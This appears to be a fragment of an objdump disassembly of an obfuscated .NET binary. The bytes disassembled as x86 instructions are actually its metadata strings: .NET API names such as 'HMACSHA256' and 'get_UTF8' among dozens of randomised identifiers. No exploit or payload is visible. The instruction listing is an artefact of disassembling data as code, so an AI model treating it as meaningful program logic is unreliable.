  407565:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40756a:	6e                   	outsb  %ds:(%esi),(%dx)
  40756b:	74 31                	je     0x40759e
  40756d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407571:	41                   	inc    %ecx
  407572:	43                   	inc    %ebx
  407573:	53                   	push   %ebx
  407574:	48                   	dec    %eax
  407575:	41                   	inc    %ecx
  407576:	32 35 36 00 67 65    	xor    0x65670036,%dh
  40757c:	74 5f                	je     0x4075dd
  40757e:	55                   	push   %ebp
  40757f:	54                   	push   %esp
  407580:	46                   	inc    %esi
  407581:	38 00                	cmp    %al,(%eax)
  407583:	3c 4d                	cmp    $0x4d,%al
  407585:	6f                   	outsl  %ds:(%esi),(%dx)
  407586:	64 75 6c             	fs jne 0x4075f5
  407589:	65 3e 00 73 4c       	gs add %dh,%ds:0x4c(%ebx)
  40758e:	69 76 4d 64 4c 4b 67 	imul   $0x674b4c64,0x4d(%esi),%esi
  407595:	55                   	push   %ebp
  407596:	47                   	inc    %edi
  407597:	66 52                	push   %dx
  407599:	41                   	inc    %ecx
  40759a:	41                   	inc    %ecx
  40759b:	00 64 43 70          	add    %ah,0x70(%ebx,%eax,2)
  40759f:	6b 42 7a 68          	imul   $0x68,0x7a(%edx),%eax
  4075a3:	56                   	push   %esi
  4075a4:	4e                   	dec    %esi
  4075a5:	59                   	pop    %ecx
  4075a6:	43                   	inc    %ebx
  4075a7:	41                   	inc    %ecx
  4075a8:	00 6e 63             	add    %ch,0x63(%esi)
  4075ab:	63 49 42             	arpl   %ecx,0x42(%ecx)
  4075ae:	66 50                	push   %ax
  4075b0:	6c                   	insb   (%dx),%es:(%edi)
  4075b1:	66 73 46             	data16 jae 0x4075fa
  4075b4:	41                   	inc    %ecx
  4075b5:	00 79 4d             	add    %bh,0x4d(%ecx)
  4075b8:	4b                   	dec    %ebx
  4075b9:	68 74 43 4e 43       	push   $0x434e4374
  4075be:	51                   	push   %ecx
  4075bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c0:	6b 63 41 00          	imul   $0x0,0x41(%ebx),%esp
  4075c4:	48                   	dec    %eax
  4075c5:	79 78                	jns    0x40763f
  4075c7:	41                   	inc    %ecx
  4075c8:	48                   	dec    %eax
  4075c9:	46                   	inc    %esi
  4075ca:	66 43                	inc    %bx
  4075cc:	63 62 48             	arpl   %esp,0x48(%edx)
  4075cf:	74 65                	je     0x407636
  4075d1:	41                   	inc    %ecx
  4075d2:	00 4c 69 6f          	add    %cl,0x6f(%ecx,%ebp,2)
  4075d6:	47                   	inc    %edi
  4075d7:	57                   	push   %edi
  4075d8:	67 67 49             	addr16 addr16 dec %ecx
  4075db:	4d                   	dec    %ebp
  4075dc:	5a                   	pop    %edx
  4075dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4075de:	6d                   	insl   (%dx),%es:(%edi)
  4075df:	41                   	inc    %ecx
  4075e0:	00 74 61 43          	add    %dh,0x43(%ecx,%eiz,2)
  4075e4:	43                   	inc    %ebx
  4075e5:	49                   	dec    %ecx
  4075e6:	56                   	push   %esi
  4075e7:	73 7a                	jae    0x407663
  4075e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4075ea:	41                   	inc    %ecx
  4075eb:	00 41 64             	add    %al,0x64(%ecx)
  4075ee:	79 4c                	jns    0x40763c
  4075f0:	43                   	inc    %ebx
  4075f1:	52                   	push   %edx
  4075f2:	6b 6e 70 42          	imul   $0x42,0x70(%esi),%ebp
  4075f6:	78 71                	js     0x407669
  4075f8:	41                   	inc    %ecx
  4075f9:	00 72 78             	add    %dh,0x78(%edx)
  4075fc:	67 75 52             	addr16 jne 0x407651
  4075ff:	76 41                	jbe    0x407642
  407601:	4f                   	dec    %edi
  407602:	4e                   	dec    %esi
  407603:	77 41                	ja     0x407646
  407605:	00 74 61 63          	add    %dh,0x63(%ecx,%eiz,2)
  407609:	62 72 47             	bound  %esi,0x47(%edx)
  40760c:	43                   	inc    %ebx
  40760d:	6a 6a                	push   $0x6a
  40760f:	6c                   	insb   (%dx),%es:(%edi)
  407610:	4d                   	dec    %ebp
  407611:	49                   	dec    %ecx
  407612:	70 56                	jo     0x40766a
  407614:	7a 41                	jp     0x407657
  407616:	00 4e 44             	add    %cl,0x44(%esi)
  407619:	6b 65 4a 49          	imul   $0x49,0x4a(%ebp),%esp
  40761d:	44                   	inc    %esp
  40761e:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  407621:	44                   	inc    %esp
  407622:	64 6d                	fs insl (%dx),%es:(%edi)
  407624:	43                   	inc    %ebx
  407625:	46                   	inc    %esi
  407626:	42                   	inc    %edx
  407627:	00 68 52             	add    %ch,0x52(%eax)
  40762a:	42                   	inc    %edx
  40762b:	6f                   	outsl  %ds:(%esi),(%dx)
  40762c:	64 64 4f             	fs fs dec %edi
  40762f:	77 44                	ja     0x407675
  407631:	58                   	pop    %eax
  407632:	71 46                	jno    0x40767a
  407634:	42                   	inc    %edx
  407635:	00 6d 56             	add    %ch,0x56(%ebp)
  407638:	64 47                	fs inc %edi
  40763a:	61                   	popa
  40763b:	78 6a                	js     0x4076a7
  40763d:	74 46                	je     0x407685
  40763f:	64 4b                	fs dec %ebx
  407641:	62 42 4a             	bound  %eax,0x4a(%edx)
  407644:	42                   	inc    %edx
  407645:	00 42 68             	add    %al,0x68(%edx)
  407648:	5a                   	pop    %edx
  407649:	41                   	inc    %ecx
  40764a:	74 54                	je     0x4076a0
  40764c:	75 45                	jne    0x407693
  40764e:	72 67                	jb     0x4076b7
  407650:	63 42 00             	arpl   %eax,0x0(%edx)
  407653:	44                   	inc    %esp
  407654:	55                   	push   %ebp
  407655:	58                   	pop    %eax
  407656:	6d                   	insl   (%dx),%es:(%edi)
  407657:	61                   	popa
  407658:	53                   	push   %ebx
  407659:	4e                   	dec    %esi
  40765a:	70 58                	jo     0x4076b4
  40765c:	45                   	inc    %ebp
  40765d:	73 62                	jae    0x4076c1
  40765f:	6c                   	insb   (%dx),%es:(%edi)
  407660:	42                   	inc    %edx
  407661:	00 73 4c             	add    %dh,0x4c(%ebx)
  407664:	56                   	push   %esi
  407665:	69 50 70 6b 75 41 42 	imul   $0x4241756b,0x70(%eax),%edx
  40766c:	6a 6d                	push   $0x6d
  40766e:	6d                   	insl   (%dx),%es:(%edi)
  40766f:	42                   	inc    %edx
  407670:	00 58 4f             	add    %bl,0x4f(%eax)
  407673:	78 66                	js     0x4076db
  407675:	4c                   	dec    %esp
  407676:	6e                   	outsb  %ds:(%esi),(%dx)
  407677:	6b 69 6e 56          	imul   $0x56,0x6e(%ecx),%ebp
  40767b:	4d                   	dec    %ebp
  40767c:	71 42                	jno    0x4076c0
  40767e:	00 71 68             	add    %dh,0x68(%ecx)
  407681:	47                   	inc    %edi
  407682:	51                   	push   %ecx
  407683:	59                   	pop    %ecx
  407684:	74 47                	je     0x4076cd
  407686:	47                   	inc    %edi
  407687:	4a                   	dec    %edx
  407688:	46                   	inc    %esi
  407689:	78 42                	js     0x4076cd
  40768b:	00 59 4e             	add    %bl,0x4e(%ecx)
  40768e:	73 5a                	jae    0x4076ea
  407690:	5a                   	pop    %edx
  407691:	51                   	push   %ecx
  407692:	4d                   	dec    %ebp
  407693:	70 6c                	jo     0x407701
  407695:	63 73 64             	arpl   %esi,0x64(%ebx)
  407698:	78 42                	js     0x4076dc
  40769a:	00 47 43             	add    %al,0x43(%edi)
  40769d:	00 74 68 6c          	add    %dh,0x6c(%eax,%ebp,2)
  4076a1:	7a 49                	jp     0x4076ec
  4076a3:	51                   	push   %ecx
  4076a4:	4d                   	dec    %ebp
  4076a5:	4a                   	dec    %edx
  4076a6:	4b                   	dec    %ebx
  4076a7:	43                   	inc    %ebx
  4076a8:	00 51 6d             	add    %dl,0x6d(%ecx)
  4076ab:	63 6f 79             	arpl   %ebp,0x79(%edi)
  4076ae:	76 62                	jbe    0x407712
  4076b0:	42                   	inc    %edx
  4076b1:	78 61                	js     0x407714
  4076b3:	4c                   	dec    %esp
  4076b4:	43                   	inc    %ebx
  4076b5:	00 48 6c             	add    %cl,0x6c(%eax)
  4076b8:	79 6a                	jns    0x407724
  4076ba:	53                   	push   %ebx
  4076bb:	6b 76 49 77          	imul   $0x77,0x49(%esi),%esi
  4076bf:	4f                   	dec    %edi
  4076c0:	58                   	pop    %eax
  4076c1:	43                   	inc    %ebx
  4076c2:	00 58 63             	add    %bl,0x63(%eax)
  4076c5:	59                   	pop    %ecx
  4076c6:	44                   	inc    %esp
  4076c7:	6c                   	insb   (%dx),%es:(%edi)
  4076c8:	5a                   	pop    %edx
  4076c9:	4f                   	dec    %edi
  4076ca:	6b 4c 42 44 00       	imul   $0x0,0x44(%edx,%eax,2),%ecx
  4076cf:	6d                   	insl   (%dx),%es:(%edi)
  4076d0:	6a 4d                	push   $0x4d
  4076d2:	4d                   	dec    %ebp
  4076d3:	45                   	inc    %ebp
  4076d4:	7a 54                	jp     0x40772a
  4076d6:	59                   	pop    %ecx
  4076d7:	6b 77 46 44          	imul   $0x44,0x46(%edi),%esi
  4076db:	00 70 69             	add    %dh,0x69(%eax)
  4076de:	47                   	inc    %edi
  4076df:	6b 61 76 61          	imul   $0x61,0x76(%ecx),%esp
  4076e3:	51                   	push   %ecx
  4076e4:	43                   	inc    %ebx
  4076e5:	65 6b 7a 47 44       	imul   $0x44,%gs:0x47(%edx),%edi
  4076ea:	00 4d 61             	add    %cl,0x61(%ebp)
  4076ed:	70 4e                	jo     0x40773d
  4076ef:	61                   	popa
  4076f0:	6d                   	insl   (%dx),%es:(%edi)
  4076f1:	65 54                	gs push %esp
  4076f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f4:	4f                   	dec    %edi
  4076f5:	49                   	dec    %ecx
  4076f6:	44                   	inc    %esp
  4076f7:	00 67 65             	add    %ah,0x65(%edi)
  4076fa:	74 5f                	je     0x40775b
  4076fc:	46                   	inc    %esi
  4076fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fe:	72 6d                	jb     0x40776d
  407700:	61                   	popa
  407701:	74 49                	je     0x40774c
  407703:	44                   	inc    %esp
  407704:	00 46 4e             	add    %al,0x4e(%esi)
  407707:	4a                   	dec    %edx
  407708:	6c                   	insb   (%dx),%es:(%edi)
  407709:	43                   	inc    %ebx
  40770a:	57                   	push   %edi
  40770b:	77 67                	ja     0x407774
  40770d:	41                   	inc    %ecx
  40770e:	61                   	popa
  40770f:	44                   	inc    %esp
  407710:	00 61 6f             	add    %ah,0x6f(%ecx)
  407713:	70 69                	jo     0x40777e
  407715:	56                   	push   %esi
  407716:	47                   	inc    %edi
  407717:	49                   	dec    %ecx
  407718:	41                   	inc    %ecx
  407719:	48                   	dec    %eax
  40771a:	75 52                	jne    0x40776e
  40771c:	67 44                	addr16 inc %esp
  40771e:	00 6d 75             	add    %ch,0x75(%ebp)
  407721:	7a 4c                	jp     0x40776f
  407723:	71 5a                	jno    0x40777f
  407725:	49                   	dec    %ecx
  407726:	44                   	inc    %esp
  407727:	55                   	push   %ebp
  407728:	61                   	popa
  407729:	6a 48                	push   $0x48
  40772b:	63 70 4a             	arpl   %esi,0x4a(%eax)
  40772e:	79 44                	jns    0x407774
  407730:	00 74 59 46          	add    %dh,0x46(%ecx,%ebx,2)
  407734:	71 47                	jno    0x40777d
  407736:	57                   	push   %edi
  407737:	72 42                	jb     0x40777b
  407739:	63 66 75             	arpl   %esp,0x75(%esi)
  40773c:	45                   	inc    %ebp
  40773d:	42                   	inc    %edx
  40773e:	45                   	inc    %ebp
  40773f:	00 70 75             	add    %dh,0x75(%eax)
  407742:	6a 6c                	push   $0x6c
  407744:	44                   	inc    %esp
  407745:	6e                   	outsb  %ds:(%esi),(%dx)
  407746:	70 51                	jo     0x407799
  407748:	76 78                	jbe    0x4077c2
  40774a:	44                   	inc    %esp
  40774b:	45                   	inc    %ebp
  40774c:	00 6c 41 77          	add    %ch,0x77(%ecx,%eax,2)
  407750:	59                   	pop    %ecx
  407751:	69 78 78 53 64 4b 56 	imul   $0x564b6453,0x78(%eax),%edi
  407758:	4f                   	dec    %edi
  407759:	48                   	dec    %eax
  40775a:	45                   	inc    %ebp
  40775b:	00 59 55             	add    %bl,0x55(%ecx)
  40775e:	72 44                	jb     0x4077a4
  407760:	4a                   	dec    %edx
  407761:	57                   	push   %edi
  407762:	64 58                	fs pop %eax
  407764:	4a                   	dec    %edx
  407765:	42                   	inc    %edx
  407766:	6b 4a 45 00          	imul   $0x0,0x45(%edx),%ecx
  40776a:	45                   	inc    %ebp
  40776b:	44                   	inc    %esp
  40776c:	71 79                	jno    0x4077e7
  40776e:	4e                   	dec    %esi
  40776f:	51                   	push   %ecx
  407770:	42                   	inc    %edx
  407771:	49                   	dec    %ecx
  407772:	4c                   	dec    %esp
  407773:	45                   	inc    %ebp
  407774:	00 4f 50             	add    %cl,0x50(%edi)
  407777:	45                   	inc    %ebp
  407778:	70 53                	jo     0x4077cd
  40777a:	4c                   	dec    %esp
  40777b:	65 4f                	gs dec %edi
  40777d:	51                   	push   %ecx
  40777e:	49                   	dec    %ecx
  40777f:	77 4c                	ja     0x4077cd
  407781:	45                   	inc    %ebp
  407782:	00 62 61             	add    %ah,0x61(%edx)
  407785:	51                   	push   %ecx
  407786:	71 45                	jno    0x4077cd
  407788:	69 69 6a 57 50 45 00 	imul   $0x455057,0x6a(%ecx),%ebp
  40778f:	6c                   	insb   (%dx),%es:(%edi)
  407790:	65 7a 6d             	gs jp  0x407800
  407793:	42                   	inc    %edx
  407794:	47                   	inc    %edi
  407795:	71 4a                	jno    0x4077e1
  407797:	59                   	pop    %ecx
  407798:	49                   	dec    %ecx
  407799:	59                   	pop    %ecx
  40779a:	67 53                	addr16 push %ebx
  40779c:	51                   	push   %ecx
  40779d:	45                   	inc    %ebp
  40779e:	00 59 4a             	add    %bl,0x4a(%ecx)
  4077a1:	45                   	inc    %ebp
  4077a2:	76 5a                	jbe    0x4077fe
  4077a4:	72 56                	jb     0x4077fc
  4077a6:	57                   	push   %edi
  4077a7:	55                   	push   %ebp
  4077a8:	70 56                	jo     0x407800
  4077aa:	61                   	popa
  4077ab:	45                   	inc    %ebp
  4077ac:	00 56 75             	add    %dl,0x75(%esi)
  4077af:	62 63 77             	bound  %esp,0x77(%ebx)
  4077b2:	76 56                	jbe    0x40780a
  4077b4:	62 61 45             	bound  %esp,0x45(%ecx)
  4077b7:	00 6e 70             	add    %ch,0x70(%esi)
  4077ba:	61                   	popa
  4077bb:	65 57                	gs push %edi
  4077bd:	77 50                	ja     0x40780f
  4077bf:	75 6d                	jne    0x40782e
  4077c1:	55                   	push   %ebp
  4077c2:	4a                   	dec    %edx
  4077c3:	6b 45 00 73          	imul   $0x73,0x0(%ebp),%eax
  4077c7:	5a                   	pop    %edx
  4077c8:	66 56                	push   %si
  4077ca:	59                   	pop    %ecx
  4077cb:	68 4c 75 74 5a       	push   $0x5a74754c
  4077d0:	52                   	push   %edx
  4077d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d2:	45                   	inc    %ebp
  4077d3:	00 77 51             	add    %dh,0x51(%edi)
  4077d6:	65 52                	gs push %edx
  4077d8:	56                   	push   %esi
  4077d9:	55                   	push   %ebp
  4077da:	6d                   	insl   (%dx),%es:(%edi)
  4077db:	52                   	push   %edx
  4077dc:	76 78                	jbe    0x407856
  4077de:	49                   	dec    %ecx
  4077df:	75 45                	jne    0x407826
  4077e1:	00 50 62             	add    %dl,0x62(%eax)
  4077e4:	69 44 6d 52 63 47 71 	imul   $0x43714763,0x52(%ebp,%ebp,2),%eax
  4077eb:	43 
  4077ec:	78 42                	js     0x407830
  4077ee:	46                   	inc    %esi
  4077ef:	00 70 41             	add    %dh,0x41(%eax)
  4077f2:	47                   	inc    %edi
  4077f3:	51                   	push   %ecx
  4077f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4077f5:	41                   	inc    %ecx
  4077f6:	54                   	push   %esp
  4077f7:	41                   	inc    %ecx
  4077f8:	4e                   	dec    %esi
  4077f9:	77 63                	ja     0x40785e
  4077fb:	46                   	inc    %esi
  4077fc:	00 45 68             	add    %al,0x68(%ebp)
  4077ff:	68 4d 6b 44 68       	push   $0x68446b4d
  407804:	4b                   	dec    %ebx
  407805:	61                   	popa
  407806:	74 46                	je     0x40784e
  407808:	00 45 77             	add    %al,0x77(%ebp)
  40780b:	77 52                	ja     0x40785f
  40780d:	67 46                	addr16 inc %esi
  40780f:	4e                   	dec    %esi
  407810:	6d                   	insl   (%dx),%es:(%edi)
  407811:	6e                   	outsb  %ds:(%esi),(%dx)
  407812:	46                   	inc    %esi
  407813:	79 46                	jns    0x40785b
  407815:	00 45 6d             	add    %al,0x6d(%ebp)
  407818:	65 45                	gs inc %ebp
  40781a:	44                   	inc    %esp
  40781b:	6a 6b                	push   $0x6b
  40781d:	79 41                	jns    0x407860
  40781f:	47                   	inc    %edi
  407820:	00 41 56             	add    %al,0x56(%ecx)
  407823:	47                   	inc    %edi
  407824:	47                   	inc    %edi
  407825:	54                   	push   %esp
  407826:	49                   	dec    %ecx
  407827:	49                   	dec    %ecx
  407828:	48                   	dec    %eax
  407829:	56                   	push   %esi
  40782a:	46                   	inc    %esi
  40782b:	52                   	push   %edx
  40782c:	75 42                	jne    0x407870
  40782e:	47                   	inc    %edi
  40782f:	47                   	inc    %edi
  407830:	00 61 51             	add    %ah,0x51(%ecx)
  407833:	71 67                	jno    0x40789c
  407835:	45                   	inc    %ebp
  407836:	4b                   	dec    %ebx
  407837:	57                   	push   %edi
  407838:	4f                   	dec    %edi
  407839:	67 55                	addr16 push %ebp
  40783b:	47                   	inc    %edi
  40783c:	00 58 70             	add    %bl,0x70(%eax)
  40783f:	78 49                	js     0x40788a
  407841:	45                   	inc    %ebp
  407842:	68 67 4d 7a 58       	push   $0x587a4d67
  407847:	71 6d                	jno    0x4078b6
  407849:	47                   	inc    %edi
  40784a:	00 6a 44             	add    %ch,0x44(%edx)
  40784d:	5a                   	pop    %edx
  40784e:	49                   	dec    %ecx
  40784f:	73 6e                	jae    0x4078bf
  407851:	4e                   	dec    %esi
  407852:	4a                   	dec    %edx
  407853:	58                   	pop    %eax
  407854:	71 47                	jno    0x40789d
  407856:	00 76 71             	add    %dh,0x71(%esi)
  407859:	76 50                	jbe    0x4078ab
  40785b:	54                   	push   %esp
  40785c:	4e                   	dec    %esi
  40785d:	66 77 72             	data16 ja 0x4078d2
  407860:	54                   	push   %esp
  407861:	4a                   	dec    %edx
  407862:	48                   	dec    %eax
  407863:	00 67 42             	add    %ah,0x42(%edi)
  407866:	58                   	pop    %eax
  407867:	56                   	push   %esi
  407868:	50                   	push   %eax
  407869:	42                   	inc    %edx
  40786a:	4c                   	dec    %esp
  40786b:	72 45                	jb     0x4078b2
  40786d:	44                   	inc    %esp
  40786e:	4b                   	dec    %ebx
  40786f:	48                   	dec    %eax
  407870:	00 65 49             	add    %ah,0x49(%ebp)
  407873:	45                   	inc    %ebp
  407874:	41                   	inc    %ecx
  407875:	61                   	popa
  407876:	56                   	push   %esi
  407877:	78 54                	js     0x4078cd
  407879:	55                   	push   %ebp
  40787a:	56                   	push   %esi
  40787b:	48                   	dec    %eax
  40787c:	00 44 6b 6f          	add    %al,0x6f(%ebx,%ebp,2)
  407880:	4f                   	dec    %edi
  407881:	79 6b                	jns    0x4078ee
  407883:	51                   	push   %ecx
  407884:	76 42                	jbe    0x4078c8
  407886:	64 67 48             	fs addr16 dec %eax
  407889:	00 6a 63             	add    %ch,0x63(%edx)
  40788c:	7a 41                	jp     0x4078cf
  40788e:	43                   	inc    %ebx
  40788f:	50                   	push   %eax
  407890:	52                   	push   %edx
  407891:	41                   	inc    %ecx
  407892:	6c                   	insb   (%dx),%es:(%edi)
  407893:	50                   	push   %eax
  407894:	69 48 00 43 4e 41 78 	imul   $0x78414e43,0x0(%eax),%ecx
  40789b:	46                   	inc    %esi
  40789c:	71 44                	jno    0x4078e2
  40789e:	48                   	dec    %eax
  40789f:	6a 55                	push   $0x55
  4078a1:	69 6b 48 00 6a 7a 4e 	imul   $0x4e7a6a00,0x48(%ebx),%ebp
  4078a8:	78 56                	js     0x407900
  4078aa:	77 78                	ja     0x407924
  4078ac:	49                   	dec    %ecx
  4078ad:	56                   	push   %esi
  4078ae:	78 47                	js     0x4078f7
  4078b0:	44                   	inc    %esp
  4078b1:	4c                   	dec    %esp
  4078b2:	67 72 48             	addr16 jb 0x4078fd
  4078b5:	00 6b 4f             	add    %ch,0x4f(%ebx)
  4078b8:	4a                   	dec    %edx
  4078b9:	53                   	push   %ebx
  4078ba:	57                   	push   %edi
  4078bb:	71 73                	jno    0x407930
  4078bd:	58                   	pop    %eax
  4078be:	66 44                	inc    %sp
  4078c0:	44                   	inc    %esp
  4078c1:	49                   	dec    %ecx
  4078c2:	00 76 44             	add    %dh,0x44(%esi)
  4078c5:	4e                   	dec    %esi
  4078c6:	62 6a 64             	bound  %ebp,0x64(%edx)
  4078c9:	6c                   	insb   (%dx),%es:(%edi)
  4078ca:	68 62 59 46 49       	push   $0x49465962
  4078cf:	00 67 65             	add    %ah,0x65(%edi)
  4078d2:	74 5f                	je     0x407933
  4078d4:	41                   	inc    %ecx
  4078d5:	53                   	push   %ebx
  4078d6:	43                   	inc    %ebx
  4078d7:	49                   	dec    %ecx
  4078d8:	49                   	dec    %ecx
  4078d9:	00 7a 4a             	add    %bh,0x4a(%edx)
  4078dc:	70 59                	jo     0x407937
  4078de:	70 6a                	jo     0x40794a
  4078e0:	70 5a                	jo     0x40793c
  4078e2:	71 41                	jno    0x407925
  4078e4:	42                   	inc    %edx
  4078e5:	50                   	push   %eax
  4078e6:	49                   	dec    %ecx
  4078e7:	00 41 45             	add    %al,0x45(%ecx)
  4078ea:	43                   	inc    %ebx
  4078eb:	4b                   	dec    %ebx
  4078ec:	76 4c                	jbe    0x40793a
  4078ee:	61                   	popa
  4078ef:	74 64                	je     0x407955
  4078f1:	71 42                	jno    0x407935
  4078f3:	55                   	push   %ebp
  4078f4:	49                   	dec    %ecx
  4078f5:	00 61 78             	add    %ah,0x78(%ecx)
  4078f8:	64 6d                	fs insl (%dx),%es:(%edi)
  4078fa:	58                   	pop    %eax
  4078fb:	68 74 7a 56 56       	push   $0x56567a74
  407900:	49                   	dec    %ecx
  407901:	00 46 75             	add    %al,0x75(%esi)
  407904:	62 4e 65             	bound  %ecx,0x65(%esi)
  407907:	69 52 42 61 49 00 58 	imul   $0x58004961,0x42(%edx),%edx
  40790e:	6f                   	outsl  %ds:(%esi),(%dx)
  40790f:	66 70 65             	data16 jo 0x407977
  407912:	46                   	inc    %esi
  407913:	73 67                	jae    0x40797c
  407915:	6b 66 66 49          	imul   $0x49,0x66(%esi),%esp
  407919:	00 49 75             	add    %cl,0x75(%ecx)
  40791c:	4f                   	dec    %edi
  40791d:	4f                   	dec    %edi
  40791e:	58                   	pop    %eax
  40791f:	53                   	push   %ebx
  407920:	54                   	push   %esp
  407921:	52                   	push   %edx
  407922:	56                   	push   %esi
  407923:	4a                   	dec    %edx
  407924:	56                   	push   %esi
  407925:	69 49 00 4f 61 51 42 	imul   $0x4251614f,0x0(%ecx),%ecx
  40792c:	63 7a 54             	arpl   %edi,0x54(%edx)
  40792f:	54                   	push   %esp
  407930:	69 48 61 4a 00 49 74 	imul   $0x7449004a,0x61(%eax),%ecx
  407937:	66 54                	push   %sp
  407939:	79 62                	jns    0x40799d
  40793b:	70 66                	jo     0x4079a3
  40793d:	62 69 72             	bound  %ebp,0x72(%ecx)
  407940:	4a                   	dec    %edx
  407941:	00 6d 70             	add    %ch,0x70(%ebp)
  407944:	68 75 57 6c 66       	push   $0x666c5775
  407949:	52                   	push   %edx
  40794a:	67 75 6d             	addr16 jne 0x4079ba
  40794d:	67 77 4a             	addr16 ja 0x40799a
  407950:	00 44 62 4d          	add    %al,0x4d(%edx,%eiz,2)
  407954:	61                   	popa
  407955:	78 51                	js     0x4079a8
  407957:	67 44                	addr16 inc %esp
  407959:	78 4d                	js     0x4079a8
  40795b:	4b                   	dec    %ebx
  40795c:	00 5a 55             	add    %bl,0x55(%edx)
  40795f:	70 69                	jo     0x4079ca
  407961:	76 74                	jbe    0x4079d7
  407963:	6d                   	insl   (%dx),%es:(%edi)
  407964:	56                   	push   %esi
  407965:	69 62 4c 78 71 54 4b 	imul   $0x4b547178,0x4c(%edx),%esp
  40796c:	00 67 75             	add    %ah,0x75(%edi)
  40796f:	55                   	push   %ebp
  407970:	57                   	push   %edi
  407971:	53                   	push   %ebx
  407972:	6a 63                	push   $0x63
  407974:	77 4c                	ja     0x4079c2
  407976:	73 56                	jae    0x4079ce
  407978:	4b                   	dec    %ebx
  407979:	00 4d 46             	add    %cl,0x46(%ebp)
  40797c:	5a                   	pop    %edx
  40797d:	5a                   	pop    %edx
  40797e:	78 4b                	js     0x4079cb
  407980:	58                   	pop    %eax
  407981:	52                   	push   %edx
  407982:	71 4d                	jno    0x4079d1
  407984:	59                   	pop    %ecx
  407985:	43                   	inc    %ebx
  407986:	61                   	popa
  407987:	4b                   	dec    %ebx
  407988:	00 48 73             	add    %cl,0x73(%eax)
  40798b:	5a                   	pop    %edx
  40798c:	42                   	inc    %edx
  40798d:	55                   	push   %ebp
  40798e:	4e                   	dec    %esi
  40798f:	50                   	push   %eax
  407990:	6d                   	insl   (%dx),%es:(%edi)
  407991:	4a                   	dec    %edx
  407992:	52                   	push   %edx
  407993:	76 4c                	jbe    0x4079e1
  407995:	68 4b 00 4a 55       	push   $0x554a004b
  40799a:	5a                   	pop    %edx
  40799b:	78 6d                	js     0x407a0a
  40799d:	75 68                	jne    0x407a07
  40799f:	51                   	push   %ecx
  4079a0:	6b 4f 72 68          	imul   $0x68,0x72(%edi),%ecx
  4079a4:	4b                   	dec    %ebx
  4079a5:	00 69 49             	add    %ch,0x49(%ecx)
  4079a8:	45                   	inc    %ebp
  4079a9:	73 72                	jae    0x407a1d
  4079ab:	66 41                	inc    %cx
  4079ad:	55                   	push   %ebp
  4079ae:	74 6e                	je     0x407a1e
  4079b0:	4b                   	dec    %ebx
  4079b1:	00 68 4a             	add    %ch,0x4a(%eax)
  4079b4:	7a 79                	jp     0x407a2f
  4079b6:	53                   	push   %ebx
  4079b7:	7a 52                	jp     0x407a0b
  4079b9:	4a                   	dec    %edx
  4079ba:	71 4c                	jno    0x407a08
  4079bc:	51                   	push   %ecx
  4079bd:	75 4b                	jne    0x407a0a
  4079bf:	00 6a 71             	add    %ch,0x71(%edx)
  4079c2:	4b                   	dec    %ebx
  4079c3:	69 46 50 6b 44 67 76 	imul   $0x7667446b,0x50(%esi),%eax
  4079ca:	4b                   	dec    %ebx
  4079cb:	00 58 4a             	add    %bl,0x4a(%eax)
  4079ce:	65 67 70 41          	gs addr16 jo 0x407a13
  4079d2:	74 76                	je     0x407a4a
  4079d4:	48                   	dec    %eax
  4079d5:	49                   	dec    %ecx
  4079d6:	41                   	inc    %ecx
  4079d7:	4c                   	dec    %esp
  4079d8:	00 42 4a             	add    %al,0x4a(%edx)
  4079db:	4d                   	dec    %ebp
  4079dc:	77 70                	ja     0x407a4e
  4079de:	48                   	dec    %eax
  4079df:	72 71                	jb     0x407a52
  4079e1:	47                   	inc    %edi
  4079e2:	50                   	push   %eax
  4079e3:	4a                   	dec    %edx
  4079e4:	76 49                	jbe    0x407a2f
  4079e6:	4c                   	dec    %esp
  4079e7:	00 44 49 45          	add    %al,0x45(%ecx,%ecx,2)
  4079eb:	62 50 43             	bound  %edx,0x43(%eax)
  4079ee:	57                   	push   %edi
  4079ef:	6b 72 59 4c          	imul   $0x4c,0x59(%edx),%esi
  4079f3:	00 44 76 64          	add    %al,0x64(%esi,%esi,2)
  4079f7:	64 63 44 44 62       	arpl   %eax,%fs:0x62(%esp,%eax,2)
  4079fc:	6a 4c                	push   $0x4c
  4079fe:	00 76 50             	add    %dh,0x50(%esi)
  407a01:	64 63 6b 77          	arpl   %ebp,%fs:0x77(%ebx)
  407a05:	54                   	push   %esp
  407a06:	48                   	dec    %eax
  407a07:	6c                   	insb   (%dx),%es:(%edi)
  407a08:	79 46                	jns    0x407a50
  407a0a:	75 4c                	jne    0x407a58
  407a0c:	00 43 6e             	add    %al,0x6e(%ebx)
  407a0f:	54                   	push   %esp
  407a10:	6a 78                	push   $0x78
  407a12:	6c                   	insb   (%dx),%es:(%edi)
  407a13:	51                   	push   %ecx
  407a14:	65 73 6e             	gs jae 0x407a85
  407a17:	74 62                	je     0x407a7b
  407a19:	7a 4c                	jp     0x407a67
  407a1b:	00 6e 54             	add    %ch,0x54(%esi)
  407a1e:	61                   	popa
  407a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a20:	57                   	push   %edi
  407a21:	6b 66 71 41          	imul   $0x41,0x71(%esi),%esp
  407a25:	47                   	inc    %edi
  407a26:	51                   	push   %ecx
  407a27:	4d                   	dec    %ebp
  407a28:	00 69 53             	add    %ch,0x53(%ecx)
  407a2b:	79 45                	jns    0x407a72
  407a2d:	4f                   	dec    %edi
  407a2e:	4a                   	dec    %edx
  407a2f:	52                   	push   %edx
  407a30:	6e                   	outsb  %ds:(%esi),(%dx)
  407a31:	47                   	inc    %edi
  407a32:	78 54                	js     0x407a88
  407a34:	4d                   	dec    %ebp
  407a35:	00 4b 75             	add    %cl,0x75(%ebx)
  407a38:	6a 6d                	push   $0x6d
  407a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  407a3b:	57                   	push   %edi
  407a3c:	6a 4e                	push   $0x4e
  407a3e:	45                   	inc    %ebp
  407a3f:	70 6f                	jo     0x407ab0
  407a41:	68 56 4d 00 4f       	push   $0x4f004d56
  407a46:	70 75                	jo     0x407abd
  407a48:	56                   	push   %esi
